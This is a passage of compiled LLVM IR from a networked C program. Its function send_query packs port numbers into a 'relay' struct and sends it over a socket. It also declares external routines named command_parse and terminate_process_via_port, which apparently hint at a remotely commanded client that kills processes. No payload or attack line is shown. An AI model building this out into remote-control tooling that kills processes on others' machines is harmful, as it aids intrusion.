; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @send_query() #0 {
  %1 = alloca %struct.relay, align 2
  %2 = getelementptr inbounds %struct.relay, %struct.relay* %1, i32 0, i32 0
  store i8 0, i8* %2, align 2
  %3 = call zeroext i16 @htons(i16 zeroext 8890) #9
  %4 = getelementptr inbounds %struct.relay, %struct.relay* %1, i32 0, i32 1
  store i16 %3, i16* %4, align 2
  %5 = call zeroext i16 @htons(i16 zeroext 5412) #9
  %6 = getelementptr inbounds %struct.relay, %struct.relay* %1, i32 0, i32 2
  store i16 %5, i16* %6, align 2
  %7 = call zeroext i16 @htons(i16 zeroext 6767) #9
  %8 = getelementptr inbounds %struct.relay, %struct.relay* %1, i32 0, i32 3
  store i16 %7, i16* %8, align 2
  %9 = call zeroext i16 @htons(i16 zeroext 1236) #9
  %10 = getelementptr inbounds %struct.relay, %struct.relay* %1, i32 0, i32 4
  store i16 %9, i16* %10, align 2
  %11 = call zeroext i16 @htons(i16 zeroext 8092) #9
  %12 = getelementptr inbounds %struct.relay, %struct.relay* %1, i32 0, i32 5
  store i16 %11, i16* %12, align 2
  %13 = call zeroext i16 @htons(i16 zeroext 3334) #9
  %14 = getelementptr inbounds %struct.relay, %struct.relay* %1, i32 0, i32 6
  store i16 %13, i16* %14, align 2
  %15 = load i32, i32* @fd, align 4
  %16 = bitcast %struct.relay* %1 to i8*
  %17 = call i64 @send(i32 %15, i8* %16, i64 78, i32 16384)
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @send(i32, i8*, i64, i32) #5

declare i64 @recv(i32, i8*, i64, i32) #5

declare void @command_parse(i8*, i32) #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i32 @sleep(i32) #5

declare void @terminate_process_via_port(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @flush_relay(%struct.relay* %0) #0 {
  %2 = alloca %struct.relay*, align 8
  store %struct.relay* %0, %struct.relay** %2, align 8
  %3 = load %struct.relay*, %struct.relay** %2, align 8
  %4 = getelementptr inbounds %struct.relay, %struct.relay* %3, i32 0, i32 0
  store i8 0, i8* %4, align 2
  %5 = load %struct.relay*, %struct.relay** %2, align 8
  %6 = getelementptr inbounds %struct.relay, %struct.relay* %5, i32 0, i32 1
  store i16 0, i16* %6, align 2
  %7 = load %struct.relay*, %struct.relay** %2, align 8
  %8 = getelementptr inbounds %struct.relay, %struct.relay* %7, i32 0, i32 2
  store i16 0, i16* %8, align 2
  %9 = load %struct.relay*, %struct.relay** %2, align 8
  %10 = getelementptr inbounds %struct.relay, %struct.relay* %9, i32 0, i32 3
  store i16 0, i16* %10, align 2
  %11 = load %struct.relay*, %struct.relay** %2, align 8
  %12 = getelementptr inbounds %struct.relay, %struct.relay* %11, i32 0, i32 4
  store i16 0, i16* %12, align 2
  %13 = load %struct.relay*, %struct.relay** %2, align 8
  %14 = getelementptr inbounds %struct.relay, %struct.relay* %13, i32 0, i32 5
  store i16 0, i16* %14, align 2
  %15 = load %struct.relay*, %struct.relay** %2, align 8
  %16 = getelementptr inbounds %struct.relay, %struct.relay* %15, i32 0, i32 6
  store i16 0, i16* %16, align 2
  %17 = load %struct.relay*, %struct.relay** %2, align 8
  %18 = getelementptr inbounds %struct.relay, %struct.relay* %17, i32 0, i32 7
  %19 = getelementptr inbounds [64 x i8], [64 x i8]* %18, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 2 %19, i8 0, i64 64, i1 false)
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #7

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { argmemonly nofree nounwind willreturn writeonly }
attributes #4 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { argmemonly nofree nounwind willreturn }
attributes #8 = { nounwind }
attributes #9 = { nounwind readnone willreturn }
attributes #10 = { nounwind readonly willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
